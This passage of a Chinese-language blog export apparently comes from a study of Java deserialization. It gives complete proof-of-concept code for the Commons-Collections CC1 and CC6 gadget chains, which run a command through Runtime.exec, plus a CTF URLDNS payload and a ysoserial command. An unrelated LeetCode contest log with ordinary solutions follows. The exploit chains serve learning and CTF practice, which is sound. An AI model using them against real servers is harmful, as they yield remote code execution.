class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            objectToString(value))</span><br><span class="line">                    .setMember(annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mv.put(name, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UnsafeAccessor.setType(<span class="built_in">this</span>, t);</span><br><span class="line">    UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心逻辑就是 <strong>Map.Entry memberValue : memberValues.entrySet() 和 memberValue.setValue(…) 。</strong></p>
<p>memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它 的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们为其精心设计的任意代码。</p>
<p>我们构造POC的时候，就需要创建一个AnnotationInvocationHandler对象，并将前面构造的 HashMap设置进来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>

<p>这里因为 sun.reflect.annotation.AnnotationInvocationHandler 是在JDK内部的类，不能直接使 用new来实例化。我使用<strong>反射</strong>获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化 了。 AnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是 参数就是前面构造的Map。</p>
<p>太多了，懒得写了，直接上payload</p>
<p>这用的是另外一条cc1，没用代理。。。。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//完整的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;), &#125;;</span><br><span class="line">        <span class="comment">//ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修饰map</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部分细节分析：</p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部分细节分析：</p>
<h2 id="java加载字节码方法"><a href="#java加载字节码方法" class="headerlink" title="java加载字节码方法"></a>java加载字节码方法</h2><h3 id="什么是字节码"><a href="#什么是字节码" class="headerlink" title="什么是字节码"></a>什么是字节码</h3><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">类的动态加载_哔哩哔哩_bilibili</a></p>
<p>load&#x3D;&gt;find&#x3D;&gt;define</p>
<h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><h3 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h3><h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a></p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h2 id="TemplatesImpl在Shiro-中的利用"><a href="#TemplatesImpl在Shiro-中的利用" class="headerlink" title="TemplatesImpl在Shiro 中的利用"></a>TemplatesImpl在Shiro 中的利用</h2><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><h2 id="CommonsBeanutils与无-commons-collections的Shiro反序列化利用"><a href="#CommonsBeanutils与无-commons-collections的Shiro反序列化利用" class="headerlink" title="CommonsBeanutils与无 commons-collections的Shiro反序列化利用"></a>CommonsBeanutils与无 commons-collections的Shiro反序列化利用</h2><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles — javacon WriteUp - Ruilin (rui0.cn)</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱 | 离别歌 (leavesongs.com)</a></p>
<p><a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">Python反序列化漏洞的花式利用 | Bendawang’s site</a></p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="Java-runtime类介绍"><a href="#Java-runtime类介绍" class="headerlink" title="Java runtime类介绍"></a>Java runtime类介绍</h3><h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p><a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>
<h3 id="LOG4J分析"><a href="#LOG4J分析" class="headerlink" title="LOG4J分析"></a>LOG4J分析</h3><h3 id="表达式上下文"><a href="#表达式上下文" class="headerlink" title="表达式上下文"></a>表达式上下文</h3><h2 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/128221385">CTFSHOW web入门 java反序列化篇（更新中）_ctfshow java_yu22x的博客-CSDN博客</a></p>
<p>[<a href="https://blog.csdn.net/solitudi/article/details/110499314">CTFSHOW]反序列化(仅更新必要的题目)_Y4tacker的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/128303093">CTFSHOW web入门 java反序列化篇 web855_ctfshow java_yu22x的博客-CSDN博客</a></p>
<h3 id="web846"><a href="#web846" class="headerlink" title="web846"></a>web846</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://f054707a-65aa-45cc-99e7-cad09571d639.challenge.ctf.show/&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        code.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        code.set(u, -<span class="number">1</span>);</span><br><span class="line">        map.put(u, url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(map);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">stream1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(map);</span><br><span class="line">        System.out.println(base64String);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用ysoserial</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS &quot;http://f054707a-65aa-45cc-99e7-cad09571d639.challenge.ctf.show/&quot;</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <tags>
        <tag>安全</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode周赛记录</title>
    <url>/2024/06/28/leetcode%E5%91%A8%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>记录从第404场开始的每次周赛（不一定准时参加，也可能之后在做）.每周一次还是有点多，两周做一次吧。主要是太菜了。。。。</p>
<span id="more"></span>

<h2 id="404场周赛"><a href="#404场周赛" class="headerlink" title="404场周赛"></a>404场周赛</h2><h3 id="3200-三角形的最大高度-简单"><a href="#3200-三角形的最大高度-简单" class="headerlink" title="3200. 三角形的最大高度-简单"></a><a href="https://leetcode.cn/problems/maximum-height-of-a-triangle/">3200. 三角形的最大高度-简单</a></h3><h4 id="题干"><a href="#题干" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你两个整数 red 和 blue，分别表示红色球和蓝色球的数量。你需要使用这些球来组成一个三角形，满足第 1 行有 1 个球，第 2 行有 2 个球，第 3 行有 3 个球，依此类推。</span><br><span class="line"></span><br><span class="line">每一行的球必须是 相同 颜色，且相邻行的颜色必须 不同。</span><br><span class="line"></span><br><span class="line">返回可以实现的三角形的 最大 高度。</span><br></pre></td></tr></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>暴力即可，即两种情况，最上面红色或者最上面蓝色。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxHeightOfTriangle</span><span class="params">(<span class="type">int</span> red, <span class="type">int</span> blue)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">red1</span> <span class="operator">=</span> red;</span><br><span class="line">        <span class="type">int</span> <span class="variable">red2</span> <span class="operator">=</span> red;</span><br><span class="line">        <span class="type">int</span> blue1= blue;</span><br><span class="line">        <span class="type">int</span> <span class="variable">blue2</span> <span class="operator">=</span> blue;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(res1%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                red1 -= (res1 + <span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                blue1 -= (res1 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(red1 &lt; <span class="number">0</span> || blue1 &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            res1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(res2%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                blue2 -= (res2 + <span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                red2 -= (res2 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(red2 &lt; <span class="number">0</span> || blue2 &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            res2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.max(res1, res2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="官方题解新解法"><a href="#官方题解新解法" class="headerlink" title="官方题解新解法"></a>官方题解新解法</h4><p>数学法：<a href="https://leetcode.cn/problems/maximum-height-of-a-triangle/solutions/2826755/3200-san-jiao-xing-de-zui-da-gao-du-by-s-m0l3/">3200. 三角形的最大高度 - 力扣（LeetCode）</a></p>
<p>懒得看了，简单题，懒得理解数学法</p>
<h3 id="3201-找出有效子序列的最大长度-I-中等"><a href="#3201-找出有效子序列的最大长度-I-中等" class="headerlink" title="3201. 找出有效子序列的最大长度 I-中等"></a><a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-i/">3201. 找出有效子序列的最大长度 I-中等</a></h3><h4 id="我的LC题解"><a href="#我的LC题解" class="headerlink" title="我的LC题解"></a>我的LC题解</h4><p><a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-i/solutions/2831684/qi-ou-xing-fen-xi-zuo-ti-by-lvvkuyrei0-gan6/">3201. 找出有效子序列的最大长度 I - 力扣（LeetCode）</a></p>
<h4 id="题干-1"><a href="#题干-1" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个整数数组 nums。</span><br><span class="line"></span><br><span class="line">nums 的子序列 sub 的长度为 x ，如果其满足以下条件，则称其为 有效子序列：</span><br><span class="line"></span><br><span class="line">(sub[0] + sub[1]) % 2 == (sub[1] + sub[2]) % 2 == ... == (sub[x - 2] + sub[x - 1]) % 2</span><br><span class="line">返回 nums 的 最长的有效子序列 的长度。</span><br><span class="line"></span><br><span class="line">一个 子序列 指的是从原数组中删除一些元素（也可以不删除任何元素），剩余元素保持原来顺序组成的新数组。</span><br></pre></td></tr></table></figure>

<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>根据公式有 sub[n+1]-sub[n]&#x3D;&#x3D;sub[n+2]-sub[n+1]%2<br>模数为0 时候&#x3D;&gt; 全为奇数全为偶数<br>模数为1 时候&#x3D;&gt; 奇偶交错<br>分为三个case分析：<br>1.全为奇数：很简单，单编遍历，得出奇数个数就好<br>2.全为偶数：很简单，单编遍历，得出偶数个数就好<br>3.交错：这个情况要复杂点。不过有点像lc的交错数组，具体来说把奇数看成1，偶数看成0。来找最长交错数组。应该有这道题，一会补下链接<br>维护两个变量，up，down。当我们遍历数组处于i的位置时:<br>if nums[i]%2 &#x3D;&#x3D; 1: up &#x3D; down + 1 else down &#x3D; up + 1。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不妨设dp数组,dp[n] dp[i]表示以nums[i]结尾的最长交错数组</span><br><span class="line">那么有</span><br><span class="line">if nums[i] % 2 == 0: dp[i] = max(dp[j] + 1 ) for j in [0,i-1] when nums[j] % 2 == 1 这个式子是很明显的</span><br><span class="line">我们接下来要证明 </span><br><span class="line">max(dp[j]) 一定是离 i 最近的 奇数。</span><br><span class="line">考虑下反证法，假设存在k&lt;j &amp;&amp; nums[k]%2== 1 &amp;&amp; dp[k] &gt; dp[j]</span><br><span class="line">(根据套路该证明dp[j] &gt; dp[k] 了)</span><br><span class="line">很明显一定有 dp[j]&gt;=dp[k]，因为对于dp[j]的子序列，我们一定可以使用dp[k]将dp[j]替换，得到相同满足条件的子序列。因此得证，nums[i] % 2 == 1 证明同理</span><br></pre></td></tr></table></figure>



